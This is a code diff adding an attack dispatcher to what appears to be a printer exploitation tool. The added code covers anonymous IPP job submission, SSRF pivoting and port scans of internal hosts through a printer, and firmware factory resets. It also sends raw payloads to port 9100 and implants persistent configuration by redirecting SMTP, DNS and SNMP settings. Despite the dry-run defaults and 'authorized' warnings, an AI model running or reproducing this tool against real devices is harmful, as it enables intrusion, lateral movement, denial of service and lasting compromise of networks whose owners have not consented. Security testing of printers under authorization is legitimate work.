@@ -104,6 +104,67 @@ def build_parser() -> argparse.ArgumentParser:
         default=None,
         help="Path to config.json (default: config.json next to src/)",
     )
+    # ── Attack modules for non-PJL/PS/PCL printers ────────────────────────────
+    parser.add_argument(
+        "--ipp",
+        action="store_true",
+        help="Full IPP security audit: anonymous job, queue purge, attr manipulation",
+    )
+    parser.add_argument(
+        "--ipp-submit",
+        action="store_true",
+        help="Submit an anonymous IPP print job (dry-run by default; add --no-dry to actually print)",
+    )
+    parser.add_argument(
+        "--no-dry",
+        action="store_true",
+        help="Disable dry-run on --ipp-submit (actually sends the print job)",
+    )
+    parser.add_argument(
+        "--pivot",
+        action="store_true",
+        help="Lateral movement audit: SSRF via IPP/WSD, internal host discovery",
+    )
+    parser.add_argument(
+        "--pivot-scan",
+        metavar="INTERNAL_HOST",
+        default=None,
+        help="Port-scan INTERNAL_HOST via printer SSRF (e.g. --pivot-scan 192.168.1.1)",
+    )
+    parser.add_argument(
+        "--storage",
+        action="store_true",
+        help="Printer storage audit: FTP, web file manager, SNMP MIB dump, saved jobs",
+    )
+    parser.add_argument(
+        "--firmware",
+        action="store_true",
+        help="Firmware audit: version extraction, upload endpoint check, NVRAM probe",
+    )
+    parser.add_argument(
+        "--firmware-reset",
+        choices=["pjl", "web", "ipp"],
+        default=None,
+        help="Attempt factory reset via specified method (DANGEROUS — authorized labs only)",
+    )
+    parser.add_argument(
+        "--payload",
+        metavar="LANG:TYPE",
+        default=None,
+        help="Inject a language-specific payload: escpr:info, pjl:reset, ps:custom, etc.",
+    )
+    parser.add_argument(
+        "--payload-data",
+        metavar="STRING",
+        default='',
+        help="Custom payload string for --payload LANG:custom",
+    )
+    parser.add_argument(
+        "--implant",
+        metavar="KEY=VALUE",
+        default=None,
+        help="Persistent config implant (smtp_host=X, dns=Y, snmp_community=Z, etc.)",
+    )
     parser.add_argument(
         "--check-config",
         action="store_true",
@@ -207,6 +268,202 @@ def _run_scan(args) -> None:
         )
     else:
         output().warning("  Could not determine printer language. Try: auto mode")
+
+# --------------------------------------------------------------------------- #
+# Attack module dispatcher
+# --------------------------------------------------------------------------- #
+def _run_attack_modules(args) -> None:
+    """
+    Dispatch to the appropriate attack/audit module based on CLI flags.
+
+    Supports: --ipp, --ipp-submit, --pivot, --pivot-scan, --storage,
+              --firmware, --firmware-reset, --payload, --implant.
+    """
+    from utils.config import load_config
+    load_config(path=getattr(args, 'config', None))
+
+    target  = args.target
+    timeout = 10.0
+
+    # ── IPP audit ─────────────────────────────────────────────────────────────
+    if getattr(args, 'ipp', False):
+        output().green(f"\n>> IPP Security Audit: {target}")
+        try:
+            from protocols.ipp_attacks import audit
+            results = audit(target, timeout=timeout, verbose=True)
+            if results['risk']:
+                output().errmsg(f"[!] Risks found: {', '.join(results['risk'])}")
+            else:
+                output().green("[OK] No critical IPP vulnerabilities detected.")
+        except Exception as exc:
+            output().errmsg(f"IPP audit error: {exc}")
+
+    # ── IPP job submission ─────────────────────────────────────────────────────
+    if getattr(args, 'ipp_submit', False):
+        dry = not getattr(args, 'no_dry', False)
+        output().green(f"\n>> IPP Job Submission: {target} "
+                       f"({'dry-run' if dry else 'LIVE — actual print'})")
+        try:
+            from protocols.ipp_attacks import discover_endpoints, submit_job
+            eps = discover_endpoints(target, timeout)
+            if not eps:
+                output().errmsg("No IPP endpoint found")
+            else:
+                ep  = eps[0]
+                res = submit_job(
+                    target, ep['port'], ep['path'], ep['scheme'],
+                    doc_fmt='image/pwg-raster', job_name='pentest-job',
+                    dry_run=dry, timeout=timeout,
+                )
+                if res['accepted']:
+                    output().errmsg(f"[!] Anonymous print ACCEPTED: {res['message']}")
+                elif res['auth_required']:
+                    output().green(f"[OK] Authentication required: {res['message']}")
+                else:
+                    output().warning(f"Result: {res['message']}")
+        except Exception as exc:
+            output().errmsg(f"IPP submit error: {exc}")
+
+    # ── Pivot / lateral movement ───────────────────────────────────────────────
+    if getattr(args, 'pivot', False):
+        output().green(f"\n>> Lateral Movement / SSRF Pivot Audit: {target}")
+        try:
+            from protocols.ssrf_pivot import pivot_audit
+            from protocols.ipp_attacks import discover_endpoints
+            eps  = discover_endpoints(target, timeout)
+            port = eps[0]['port'] if eps else 631
+            path = eps[0]['path'] if eps else '/ipp/print'
+            scheme = eps[0]['scheme'] if eps else 'https'
+            results = pivot_audit(target, port, path, scheme, timeout, verbose=True)
+            if results['risk']:
+                output().errmsg(f"[!] Pivot risks: {', '.join(results['risk'])}")
+                if results['internal_hosts']:
+                    output().errmsg(
+                        f"[!] Internal hosts reachable via SSRF: "
+                        f"{', '.join(results['internal_hosts'])}"
+                    )
+            else:
+                output().green("[OK] No SSRF pivot vectors confirmed.")
+        except Exception as exc:
+            output().errmsg(f"Pivot audit error: {exc}")
+
+    # ── Pivot port scan ────────────────────────────────────────────────────────
+    if getattr(args, 'pivot_scan', None):
+        internal = args.pivot_scan
+        output().green(f"\n>> SSRF Port Scan: {internal} via printer {target}")
+        try:
+            from protocols.ipp_attacks import discover_endpoints
+            from protocols.ssrf_pivot import ssrf_port_scan
+            eps    = discover_endpoints(target, timeout)
+            port   = eps[0]['port'] if eps else 631
+            path   = eps[0]['path'] if eps else '/ipp/print'
+            scheme = eps[0]['scheme'] if eps else 'https'
+            scan_results = ssrf_port_scan(
+                target, port, path, internal,
+                scheme=scheme, timeout=6, verbose=True,
+            )
+            open_ports = [p for p, s in scan_results.items() if s == 'open']
+            if open_ports:
+                output().errmsg(f"[!] Open ports on {internal}: {open_ports}")
+            else:
+                output().green(f"[OK] No open ports detected on {internal} via SSRF.")
+        except Exception as exc:
+            output().errmsg(f"Pivot scan error: {exc}")
+
+    # ── Storage audit ─────────────────────────────────────────────────────────
+    if getattr(args, 'storage', False):
+        output().green(f"\n>> Printer Storage Audit: {target}")
+        try:
+            from protocols.storage import storage_audit
+            results = storage_audit(target, timeout=timeout, verbose=True)
+            if results['risk']:
+                output().errmsg(f"[!] Storage risks: {'; '.join(results['risk'])}")
+            else:
+                output().green("[OK] No storage vulnerabilities found.")
+        except Exception as exc:
+            output().errmsg(f"Storage audit error: {exc}")
+
+    # ── Firmware audit ────────────────────────────────────────────────────────
+    if getattr(args, 'firmware', False):
+        output().green(f"\n>> Firmware Security Audit: {target}")
+        try:
+            from protocols.firmware import firmware_audit
+            results = firmware_audit(target, timeout=timeout, verbose=True)
+            if results['risk']:
+                output().errmsg(f"[!] Firmware risks: {', '.join(results['risk'])}")
+            else:
+                output().green("[OK] No firmware vulnerabilities found.")
+        except Exception as exc:
+            output().errmsg(f"Firmware audit error: {exc}")
+
+    # ── Factory reset ─────────────────────────────────────────────────────────
+    if getattr(args, 'firmware_reset', None):
+        method = args.firmware_reset
+        output().warning(f"\n[!] Factory reset via {method} on {target} — AUTHORIZED TARGET ONLY")
+        try:
+            from protocols.firmware import factory_reset
+            ok = factory_reset(target, timeout=timeout, method=method, verbose=True)
+            if ok:
+                output().errmsg(f"[!] Factory reset command accepted via {method}")
+            else:
+                output().green(f"[OK] Reset command rejected or not supported")
+        except Exception as exc:
+            output().errmsg(f"Firmware reset error: {exc}")
+
+    # ── Payload injection ─────────────────────────────────────────────────────
+    if getattr(args, 'payload', None):
+        spec = args.payload
+        custom_data = getattr(args, 'payload_data', '')
+        try:
+            lang, kind = spec.split(':', 1)
+        except ValueError:
+            lang, kind = spec, 'info'
+        output().green(f"\n>> Payload Injection: lang={lang} type={kind} target={target}")
+        try:
+            from protocols.firmware import make_payload
+            payload = make_payload(lang, kind, custom_data)
+            if not payload:
+                output().warning(f"No payload generated for {lang}:{kind}")
+            else:
+                # Send to RAW port 9100
+                import socket as _sock
+                s = _sock.create_connection((target, 9100), timeout=timeout)
+                s.sendall(payload)
+                _sock.setdefaulttimeout(2)
+                resp = b''
+                try:
+                    resp = s.recv(4096)
+                except Exception:
+                    pass
+                s.close()
+                output().green(f"[+] Payload sent ({len(payload)} bytes)")
+                if resp:
+                    output().message(f"    Response: {resp[:200]}")
+        except Exception as exc:
+            output().errmsg(f"Payload error: {exc}")
+
+    # ── Persistent implant ────────────────────────────────────────────────────
+    if getattr(args, 'implant', None):
+        raw = args.implant
+        output().warning(f"\n[!] Persistent implant on {target}: {raw}")
+        try:
+            pairs = dict(kv.split('=', 1) for kv in raw.split(',') if '=' in kv)
+            from protocols.firmware import implant_config
+            results = implant_config(
+                target,
+                smtp_host      = pairs.get('smtp_host', ''),
+                smtp_email     = pairs.get('smtp_email', ''),
+                ntp_host       = pairs.get('ntp_host', ''),
+                dns_server     = pairs.get('dns', ''),
+                snmp_community = pairs.get('snmp_community', ''),
+                timeout=timeout, verbose=True,
+            )
+            for k, ok in results.items():
+                status = '\033[1;31m[IMPLANTED]\033[0m' if ok else '[failed]'
+                output().message(f"  {status} {k}")
+        except Exception as exc:
+            output().errmsg(f"Implant error: {exc}")
+
 
 # --------------------------------------------------------------------------- #
 # Banner
@@ -347,6 +604,18 @@ def main() -> None:
             output().errmsg("--scan requires a target: python src/main.py <ip> --scan")
             sys.exit(1)
         _run_scan(args)
+        sys.exit(0)
+
+    # ── Attack / audit dispatchers ────────────────────────────────────────────
+    _needs_target = ('ipp', 'ipp_submit', 'pivot', 'storage', 'firmware',
+                     'firmware_reset', 'payload', 'implant')
+    _any_attack = any(getattr(args, a.replace('-', '_'), None)
+                      for a in _needs_target)
+    if _any_attack:
+        if not args.target:
+            output().errmsg("Attack flags require a target IP/host.")
+            sys.exit(1)
+        _run_attack_modules(args)
         sys.exit(0)
 
     # Show banner first (respects --quiet).
